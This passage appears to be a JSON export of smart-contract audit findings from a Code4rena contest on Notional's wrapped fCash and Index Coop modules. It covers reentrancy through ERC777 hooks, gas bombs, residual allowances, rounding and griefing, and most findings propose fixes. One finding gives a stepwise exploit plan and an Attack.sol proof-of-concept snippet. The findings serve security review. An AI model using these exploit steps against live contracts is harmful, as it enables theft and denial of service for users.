`cvxCrv` tokens distributed on AuraLocker.sol.   1: Attacker will send one wei of token that are distributed on the [AuraLocker.sol ](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol) to [AuraStakingProxy](https://github.com/aurafinance/aura-contracts-lite/blob/6d60fca6f821dca1854a538807e7928ee582553a/contracts/AuraStakingProxy.sol).  2: Attacker will call [distributeOther](https://github.com/aurafinance/aura-contracts-lite/blob/6d60fca6f821dca1854a538807e7928ee582553a/contracts/AuraStakingProxy.sol#L203). The function will call notifyRewardAmount that calls [_notifyReward](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L860)   When calling [_notifyReward](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L860) the rewards left to distribute over the 7 days are redistributed throughout a new period starting immediately.  ``` uint256 remaining = uint256(rdata.periodFinish).sub(block.timestamp); uint256 leftover = remaining.mul(rdata.rewardRate); rdata.rewardRate = _reward.add(leftover).div(rewardsDuration).to96(); ```  _Example:_ If the reward rate is 1 token (10**18) per second and 3.5 days are left (302400 seconds), we get a leftover of 302400 tokens. this is then divided by 604800, the reward rate is now 0.5 and the user of the protocol will have to wait one week for tokens that were supposed to be distributed over 3.5 days. This can be repeated again and again so that some rewards are never distributed.    ### Suggestion I can see that [queueNewRewards](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L820) has some protective mechanism. A new period is started only if the token that is added on top of the already distributed tokens during the duration is over 120%.  I suggest adding a similar check to [queueNewRewards](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L820)   "}, {"title": "Upgraded Q -> M from 104 [1656258768065]", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/239", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "upgraded by judge"], "target": "2022-06-notional-coop-findings", "body": "Judge has assessed an item in Issue #104 as Medium risk. The relevant finding follows:\r \r ## L01: Silent overflow of `_fCashAmount`\r \r ### Line References\r \r [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L526](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L526)\r \r ### Description\r \r If a `_fCashAmount` value that is greater than uint88 is passed into the `_mint` function, downcasting it to uint88 will silently overflow. \r \r ### Recommended Mitigation Steps\r \r ```solidity\r // Use a safe downcast function e.g. wfCashLogic::_safeUint88\r function _safeUint88(uint256 x) internal pure returns (uint88) {hil\r     require(x <= uint256(type(uint88).max));\r     return uint88(x);\r }\r ```\r "}, {"title": "User can alter amount returned by redeem function due to control transfer", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/235", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L212-L222   # Vulnerability details  ## Impact Control is transferred to the receiver when receiving the ERC777. They are able to transfer the ERC777 to another account, at which time the before and after balance calculation will be incorrect.  ```         uint256 balanceBefore = IERC20(asset()).balanceOf(receiver);           if (msg.sender != owner) {             _spendAllowance(owner, msg.sender, shares);         }         _redeemInternal(shares, receiver, owner); ///////////// Control is transferred to user. They can alter their balance here. ///////////          uint256 balanceAfter = IERC20(asset()).balanceOf(receiver);         uint256 assets = balanceAfter - balanceBefore;  ////////// Assets can be as low as 0 if they have transferred the same amount out as received. //////////          emit Withdraw(msg.sender, receiver, owner, assets, shares);         return assets; ```  ## Tools Used Manual review  "}, {"title": "`IsWrappedFcash` check is a gas bomb", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/188", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Index"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/main/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L639-L647   # Vulnerability details  ## Impact In the `_isWrappedFCash` check, the `notionalTradeModule` check whether the component is a wrappedCash with the following logic.  ```soliditiy         try IWrappedfCash(_fCashPosition).getDecodedID() returns(uint16 _currencyId, uint40 _maturity){             try wrappedfCashFactory.computeAddress(_currencyId, _maturity) returns(address _computedAddress){                 return _fCashPosition == _computedAddress;             } catch {                 return false;             }         } catch {             return false;         } ```  The above logic is dangerous when `_fCashPosition` do not revert on `getDecodedID` but instead give a wrong format of return value. The contract would try to decode the return value into `returns(uint16 _currencyId, uint40 _maturity)` and revert. The revert would consume what ever gas it's provided.  [CETH](https://etherscan.io/address/0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5) is an exmple. There's a fallback function in `ceth` ```soliditiy     function () external payable {         requireNoError(mintInternal(msg.value), \"mint failed\");     } ``` As a result, calling `getDecodedID` would not revert. Instead, calling `getDecodedID` of `CETH` would consume all remaining gas. This creates so many issues. First, users would waste too much gas on a regular operation. Second, the transaction might fail if `ceth` is not the last position. Third, the wallet contract can not interact with set token with ceth as it consumes all gas.   ## Proof of Concept  The following contract may fail to redeem setTokens as it consumes too much gas (with 20M gas limit).    [Test.sol](https://gist.github.com/Jonah246/fad9e489fe84a6fb8b4894d7377fd8a2)  ```soliditiy     function test(uint256 _amount) external {         cToken.approve(address(issueModule), uint256(-1));         wfCash.approve(address(issueModule), uint256(-1));         issueModule.issue(setToken, _amount, address(this));         issueModule.redeem(setToken, _amount, address(this));     } ```  Also, we can check how much gas it consumes with the following function.  ```soliditiy     function TestWrappedFCash(address _fCashPosition) public view returns(bool){         if(!_fCashPosition.isContract()) {             return false;         }         try IWrappedfCash(_fCashPosition).getDecodedID() returns(uint16 _currencyId, uint40 _maturity){             try wrappedfCashFactory.computeAddress(_currencyId, _maturity) returns(address _computedAddress){                 return _fCashPosition == _computedAddress;             } catch {                 return false;             }         } catch {             return false;         }     } ```  Test this function with `cdai` and `ceth`, we can observe that there's huge difference of gas consumption here. ``` Gas used:            30376 of 130376 Gas used:            19479394 of 19788041 ``` ## Tools Used Manual inspection. Hardhat  ## Recommended Mitigation Steps  I recommend building a map in the notionalTradeModule and inserting the wrappeCash in the `mintFCashPosition` function.  ```soliditiy function addWrappedCash(uint16 _currencyId, uint40 _maturity) public {     address computedAddress = wrappedfCashFactory.computeAddress(_currencyId, _maturity);     wrappedFCash[computedAddress] = true; } ```  Or we could replace the try-catch pattern with a low-level function call and check the return value's length before decoding it.  Something like this might be a fix. ```soliditiy     (bool success, bytes memory returndata) = target.delegatecall(data);     if (!success || returndata.length != DECODED_ID_RETURN_LENGTH) {         return false;     }    // abi.decode .... ```  "}, {"title": "wfCash4626 withdraw method can settle the account", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/169", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L192   # Vulnerability details  `withdraw` will revert if the account has not been settled yet. This is just due to the implementation and can be avoided by, well, settling the account.  ## Impact `withdraw` reverts unnecessarily. Protocols and users which will use wfCash4626 will have to discover this and settle by themselves.  ## Proof of Concept `withdraw` [calls](https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L192) `previewWithdraw`, which ends up calling `_getMaturedValue`, which [will revert](https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L23) if the account is not settled yet.  ## Recommended Mitigation Steps Add to `withdraw`: ``` NotionalV2.settleAccount(address(this)); ``` This will ensure that the account is settled and `withdraw` will not revert.  "}, {"title": "DOS set token through erc777 hook", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/168", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/main/index-coop-notional-trade-module/contracts/protocol/modules/v1/DebtIssuanceModule.sol#L131-L141 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol#L376-L380   # Vulnerability details  ## Impact The `wfCash` is an `erc777` token. [ERC777.sol#L376-L380](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol#L376-L380) Users can get the control flow before sending token and after receiving tokens. This creates attack vectors that require extra caution in designing modules. Any combination of modules may lead to a possible exploit. To elaborate on the dangerousness of the re-entrancy attack, a possible scenario is presented.  Before the exploit, we first elaborate on three attack vectors:  1. [DebtIssuanceModule.sol#L131-L141](https://github.com/code-423n4/2022-06-notional-coop/blob/main/index-coop-notional-trade-module/contracts/protocol/modules/v1/DebtIssuanceModule.sol#L131-L141) The issuance module would pull tokens from the sender before minting setToken. Assume there are three compoenents in this set. 1. CDai. 2. wfCash  In the `_callTokensToSend`, the setToken has received `cdai` and the `totalSupply` is still the same.  2. `nonReentrant` does not protect cross-contract re-entrancy. This means, that during the `issue` of issuance module, users can trigger other modules' functions.  3. Restricted functions with `onlyManagerAndValidSet` modifier may be triggered by the exploiter as well. Manager of a setToken is usually a manager contract. Assume it's a multisig-wallet, the exploiter can front-run the execute transaction and replay the payload during his exploit. Note, a private transaction from flash-bot can still be front-run. Please refer to the [uncle bandit risk](https://docs.flashbots.net/flashbots-protect/rpc/uncle-bandits)   Given the above attack vectors, the exploiter have enough weapons to exploit the `setToken` at a propriate time. Note that different combination of modules may have different exploit paths. As long as the above attack vectors remain, the setToken is vulnerable.  Assume a setToken with `CompoundLeverageModule`, `NotionalTradeModule` and `BasicIssuanceModule` with the following positions: 1. CDAI: 100  2. wfCash-DAI 100  and totalSupply = 100. The community decides to remove the `compoundLeverageModule` from the set token. Since `notionalTradeModule` can handle cDAI, the community vote to just call `removeModule` to remove `compoundLeverageModule`. The exploiter has the time to build an exploit and wait the right timing to come.  0. The exploiter listen the manager multisig wallet. 1. Exploiter issue 10 setToken. 2. During the `_callTokensToSend` of `wfcash`, the totalSupply = 100, CDAI = 110, wfCash-DAI = 110. 3. Call `sync` of `CompoundLeverageModule`. `_getCollateralPosition` get  `_cToken.balanceOf(address(_setToken)) = 110` and `totalSupply = 100` and update the `DefaultUnit` of `CETH` 1,1X. 4. Replay multisig wallet's payload and remove `compoundLeverageModule`. 5. The `setToken` can no longer issue / redeem as it would raise `undercollateralized` error. Further, `setValuer` would give a pumped valuation that may cause harm to other protocols.   ## Proof of Concept  [POC](https://gist.github.com/Jonah246/13e58b59765c0334189c99a9f29c6dab) The exploit is quite lengthy. Please check the `Attack.sol` for the main exploit logic. ```soliditiy     function register() public {         _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));         _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));     }      function attack(uint256 _amount) external {         cToken.approve(address(issueModule), uint256(-1));         wfCash.approve(address(issueModule), uint256(-1));         issueModule.issue(setToken, _amount, address(this));     }      function tokensToSend(         address operator,         address from,         address to,         uint256 amount,         bytes calldata userData,         bytes calldata operatorData     ) external {         compoundModule.sync(setToken, false);         manager.removeModule(address(setToken));     } ```  ## Tools Used Manual inspection.  ## Recommended Mitigation Steps  The design choice of wfcash being an `ERC777` seems unnecessary to me. Over the past two years, ERC777 leads to so many exploits. [IMBTC-UNISWAP](https://defirate.com/imbtc-uniswap-hack/) [CREAM-AMP](https://twitter.com/CreamdotFinance/status/1432249771750686721?s=20) I recommend the team using ERC20 instead.  If the SetToken team considers supporting ERC777 necessary, I recommend implementing protocol-wide cross-contract reentrancy prevention. Please refer to Rari-Capital. [Comptroller.sol#L1978-L2002](https://github.com/Rari-Capital/fuse-v1/blob/development/src/core/Comptroller.sol#L1978-L2002)  Note that, `Rari` was [exploited](https://www.coindesk.com/business/2022/04/30/defi-lender-rari-capitalfei-loses-80m-in-hack/) given this reentrancy prevention. Simply making `nonReentrant` cross-contact prevention may not be enough. I recommend to setToken protocol going through every module and re-consider whether it's re-entrancy safe.  "}, {"title": "Residual Allowance Might Allow Tokens In SetToken To Be Stolen", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Index"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L418 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L493   # Vulnerability details  ## Proof-of-Concept  Whenever `_mintFCashPosition` function is called to mint new fCash position, the contract will call the `_approve` function to set the allowance to `_maxSendAmount` so that the fCash Wrapper contact can pull the payment tokens from the SetToken contract during minting.  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L418](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L418)  ```solidity function _mintFCashPosition(     ISetToken _setToken,     IWrappedfCashComplete _fCashPosition,     IERC20 _sendToken,     uint256 _fCashAmount,     uint256 _maxSendAmount ) internal returns(uint256 sentAmount) {     if(_fCashAmount == 0) return 0;     bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken);       _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);      uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));     uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));      _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying)   ..SNIP.. } ```  Note that `_maxSendAmount` is the maximum amount of payment tokens that is allowed to be consumed during minting. This is not the actual amount of payment tokens consumed during the minting process. Thus, after the minting, there will definitely be some residual allowance since it is unlikely that the fCash wrapper contract will consume the exact maximum amount during minting.  The following piece of code shows that having some residual allowance is expected. The `_approve` function will not set the allowance unless there is insufficient allowance.  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L493](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L493)  ```solidity /**  * @dev Approve the given wrappedFCash instance to spend the setToken's sendToken   */ function _approve(     ISetToken _setToken,     IWrappedfCashComplete _fCashPosition,     IERC20 _sendToken,     uint256 _maxAssetAmount ) internal {     if(IERC20(_sendToken).allowance(address(_setToken), address(_fCashPosition)) < _maxAssetAmount) {         bytes memory approveCallData = abi.encodeWithSelector(_sendToken.approve.selector, address(_fCashPosition), _maxAssetAmount);         _setToken.invoke(address(_sendToken), 0, approveCallData);     } } ```  ## Impact  Having residual allowance increases the risk of the asset tokens being stolen from the SetToken contract. SetToken contract is where all the tokens/assets are held. If the Notional's fCash wrapper contract is compromised, it will allow the compromised fCash wrapper contract to withdraw funds from the SetToken contract due to the residual allowance.   Note that Notional's fCash wrapper contract is not totally immutable, as it is a upgradeable contract. This is an additional risk factor to be considered. If the Notional's deployer account is compromised, the attacker could upgrade the Notional's fCash wrapper contract to a malicious one to withdraw funds from the Index Coop's SetToken contract due to the residual allowance.   Index Coop and Notional are two separate protocols and teams. Thus, it is a good security practice not to place any trust on external party wherever possible to ensure that if one party is compromised, it won't affect the another party. Thus, there should not be any residual allowance that allows Notional's contract to withdraw fund from Index Coop's contract in any circumstance.  In the worst case scenario, a \"lazy\" manager might simply set the `_maxAssetAmount` to `type(uint256).max`. Thus, this will result in large amount of residual allowance left, and expose the SetToken contract to significant risk.  ## Recommended Mitigation Steps  Approve the allowance on-demand whenever _`mintFCashPosition` is called, and reset the allowance back to zero after each minting process to eliminate any residual allowance.  ```diff function _mintFCashPosition(     ISetToken _setToken,     IWrappedfCashComplete _fCashPosition,     IERC20 _sendToken,     uint256 _fCashAmount,     uint256 _maxSendAmount ) internal returns(uint256 sentAmount) {     if(_fCashAmount == 0) return 0;     bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken);       _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);      uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));     uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));      _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying)   ..SNIP..   + // Reset the allowance back to zero after minting + _approve(_setToken, _fCashPosition, _sendToken, 0); } ```  Update the `_approve` accordingly to remove the if-statement related to residual allowance.  ```diff function _approve(     ISetToken _setToken,     IWrappedfCashComplete _fCashPosition,     IERC20 _sendToken,     uint256 _maxAssetAmount ) internal { -    if(IERC20(_sendToken).allowance(address(_setToken), address(_fCashPosition)) < _maxAssetAmount) {         bytes memory approveCallData = abi.encodeWithSelector(_sendToken.approve.selector, address(_fCashPosition), _maxAssetAmount);         _setToken.invoke(address(_sendToken), 0, approveCallData); -    } } ```  "}, {"title": "Rounding Issues In Certain Functions", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/155", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L134   # Vulnerability details  ## Background  Per EIP 4626's Security Considerations (https://eips.ethereum.org/EIPS/eip-4626)  > Finally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users: > > - If (1) it\u2019s calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) it\u2019s determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round *down*. > - If (1) it\u2019s calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) it\u2019s calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round *up*.  Thus, the result of the `previewMint` and `previewWithdraw` should be rounded up.  ## Proof-of-Concept  The current implementation of `convertToShares` function will round down the number of shares returned due to how solidity handles Integer Division. ERC4626 expects the returned value of `convertToShares` to be rounded down. Thus, this function behaves as expected.  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52)  ```solidity function convertToShares(uint256 assets) public view override returns (uint256 shares) {     uint256 supply = totalSupply();     if (supply == 0) {         // Scales assets by the value of a single unit of fCash         uint256 unitfCashValue = _getPresentValue(uint256(Constants.INTERNAL_TOKEN_PRECISION));         return (assets * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / unitfCashValue;     }      return (assets * totalSupply()) / totalAssets(); } ```  ERC 4626 expects the result returned from `previewWithdraw` function to be rounded up. However, within the `previewWithdraw` function, it calls the `convertToShares` function. Recall earlier that the `convertToShares` function returned a rounded down value,  thus `previewWithdraw` will return a rounded down value instead of round up value. Thus, this function does not behave as expected.  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L134](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L134)  ```solidity function previewWithdraw(uint256 assets) public view override returns (uint256 shares) {     if (hasMatured()) {         shares = convertToShares(assets);     } else {         // If withdrawing non-matured assets, we sell them on the market (i.e. borrow)         (uint16 currencyId, uint40 maturity) = getDecodedID();         (shares, /* */, /* */) = NotionalV2.getfCashBorrowFromPrincipal(             currencyId,             assets,             maturity,             0,             block.timestamp,             true         );     } } ```  `previewWithdraw` and `previewMint` functions rely on `NotionalV2.getfCashBorrowFromPrincipal` and `NotionalV2.getDepositFromfCashLend` functions. Due to the nature of time-boxed contest, I was unable to verify if `NotionalV2.getfCashBorrowFromPrincipal` and `NotionalV2.getDepositFromfCashLend` functions return a rounded down or up value. If a rounded down value is returned from these functions, `previewWithdraw` and `previewMint` functions would not behave as expected.  ## Impact  Other protocols that integrate with Notional's fCash wrapper might wrongly assume that the functions handle rounding as per ERC4626 expectation. Thus, it might cause some intergration problem in the future that can lead to wide range of issues for both parties.  ## Recommended Mitigation Steps  Ensure that the rounding of vault's functions behave as expected. Following are the expected rounding direction for each vault function:  - previewMint(uint256 shares) - Round Up \u2b06  - previewWithdraw(uint256 assets) - Round Up \u2b06  - previewRedeem(uint256 shares) - Round Down \u2b07  - previewDeposit(uint256 assets) - Round Down \u2b07  - convertToAssets(uint256 shares) - Round Down \u2b07  - convertToShares(uint256 assets) - Round Down \u2b07  `previewMint` returns the  amount of assets that would be deposited to mint specific amount of shares. Thus, the amount of assets must be rounded up, so that the vault won't be shortchanged.  `previewWithdraw` returns the amount of shares that would be burned to withdraw specific amount of asset. Thus, the amount of shares must to be rounded up, so that the vault won't be shortchanged.  Following is the OpenZeppelin's vault implementation for rounding reference:  [https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20TokenizedVault.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20TokenizedVault.sol)  Alternatively, if such alignment of rounding could not be achieved due to technical limitation, at the minimum, document this limitation in the comment so that the developer performing the integration is aware of this.  "}, {"title": "Users Might Not Be Able To Purchase Or Redeem SetToken", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/154", "labels": ["bug", "help wanted", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "Index"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L309 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385   # Vulnerability details  ## Proof-of-Concept  Whenever a setToken is issued or redeemed, the `moduleIssueHook` and `moduleRedeemHook` will be triggered. These two hooks will in turn call the `_redeemMaturedPositions` function to ensure that no matured fCash positions remain in the Set by redeeming any matured fCash position.  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L309](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L309)  ```solidity /**  * @dev Hook called once before setToken issuance  * @dev Ensures that no matured fCash positions are in the set when it is issued  */ function moduleIssueHook(ISetToken _setToken, uint256 /* _setTokenAmount */) external override onlyModule(_setToken) {     _redeemMaturedPositions(_setToken); }  /**  * @dev Hook called once before setToken redemption  * @dev Ensures that no matured fCash positions are in the set when it is redeemed  */ function moduleRedeemHook(ISetToken _setToken, uint256 /* _setTokenAmount */) external override onlyModule(_setToken) {     _redeemMaturedPositions(_setToken); } ```  The `_redeemMaturedPositions` will loop through all its fCash positions and attempts to redeem any fCash position that has already matured. However, if one of the fCash redemptions fails, it will cause the entire function to revert. If this happens, no one could purchase or redeem the setToken because `moduleIssueHook` and `modileRedeemHook` hooks will revert every single time. Thus, the setToken issuance and redemption will stop working entirely and  this setToken can be considered \"bricked\".  [https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385)  ```solidity /**  * @dev Redeem all matured fCash positions for the given SetToken  */ function _redeemMaturedPositions(ISetToken _setToken) internal {     ISetToken.Position[] memory positions = _setToken.getPositions();     uint positionsLength = positions.length;      bool toUnderlying = redeemToUnderlying[_setToken];      for(uint256 i = 0; i < positionsLength; i++) {         // Check that the given position is an equity position         if(positions[i].unit > 0) {             address component = positions[i].component;             if(_isWrappedFCash(component)) {                 IWrappedfCashComplete fCashPosition = IWrappedfCashComplete(component);                 if(fCashPosition.hasMatured()) {                     (IERC20 receiveToken,) = fCashPosition.getToken(toUnderlying);                     if(address(receiveToken) == ETH_ADDRESS) {                         receiveToken = weth;                     }                     uint256 fCashBalance = fCashPosition.balanceOf(address(_setToken));                     _redeemFCashPosition(_setToken, fCashPosition, receiveToken, fCashBalance, 0);                 }             }         }     } } ```  ## Impact  User will not be able to purchase or redeem the setToken. User's fund will stuck in the SetToken Contract. Unable to remove matured fCash positions from SetToken and update positions of its asset token.  ## Recommended Mitigation Steps  This is a problem commonly encountered whenever a method of a smart contract calls another contract \u2013 you cannot rely on the other contract to work 100% of the time, and it is dangerous to assume that the external call will always be successful.   It is recommended to:  - Consider alternate method of updating the asset position so that the SetToken's core functions (e.g. issuance and redemption) will not be locked if one of the matured fCash redemptions fails.  - Evaluate if `_redeemMaturedPositions` really need to be called during SetToken's issuance and redemption. If not, consider removing them from the hooks, so that any issue or revert within `_redeemMaturedPositions` won't cause the SetToken's issuance and redemption functions to stop working entirely. - Consider implementing additional function to give manager/user an option to specify a list of matured fCash positions to redeem instead of forcing them to redeem all matured fCash positions at one go.  "}, {"title": "fCash of the wrong maturity and asset can be sent to wrapper address before wrapper is deployed ", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/115", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L131   # Vulnerability details  ## Impact Minting becomes impossible   ## Proof of Concept onERC1155Received is only called when the size of the code deployed at the address contains code. Since create2 is used to deploy the contract, the address can be calculated before the contract is deployed. A malicious actor could send the address fCash of a different maturity or asset before the contract is deployed and since nothing has been deployed, onERC1155Received will not be called and the address will accept the fCash. After the contract is deployed and correct fCash is sent to the address, onERC1155Received will check the length of the assets held by the address and it will be more than 1 (fCash of correct asset and maturity and fCash with wrong maturity or asset sent before deployment). This will cause the contract to always revert essentially breaking the mint completely.   ## Tools Used  ## Recommended Mitigation Steps When the contract is created create a function that reads how many fCash assets are at the address and send them away if they aren't of the correct asset and maturity  "}, {"title": "transferfCash does not work as expected", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashLogic.sol#L184   # Vulnerability details  ## Impact If maturity is reached and user has asked for redeem with opts.transferfCash as true, then if (hasMatured()) turns true at wfCashLogic.sol#L216 causing fcash to be cashed out in underlying token and then sent to receiver. So receiver obtains underlying when fcash was expected. The sender wont get an error thinking fcash transfer was success  ## Proof of Concept  1. User A calls redeem with opts.transferfCash as true and receiver as User B 2. Since maturity is reached so instead of transferring the fCash, contract would simply cash out fCash and sent the underlying token to the receiver which was not expected  ## Recommended Mitigation Steps If opts.transferfCash is true and maturity is reached then throw an error mentioning that fCash can no longer be transferred  "}, {"title": "The logic of _isUnderlying() in NotionalTradeModule is wrong which will cause mintFCashPosition() and redeemFCashPosition() revert on `fcash` tokens which asset token is underlying token (asset.tokenType == TokenType.NonMintable)", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/87", "labels": ["bug", "help wanted", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "Index"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L558-L575   # Vulnerability details  ## Impact For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting or burning when it is called with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in `NotionalTradeModule ` will not work for those `fcash` tokens because `_isUnderlying()` returns `true` result for those tokens which would make `NotionalTradeModule`'s logic for `mintFCashPosition()` and `redeemFCashPosition()` will eventually call `redeemToUnderlying()` and `mintViaUnderlying()` in `wfCashLogic` and those function in `wfCashLogic` will call 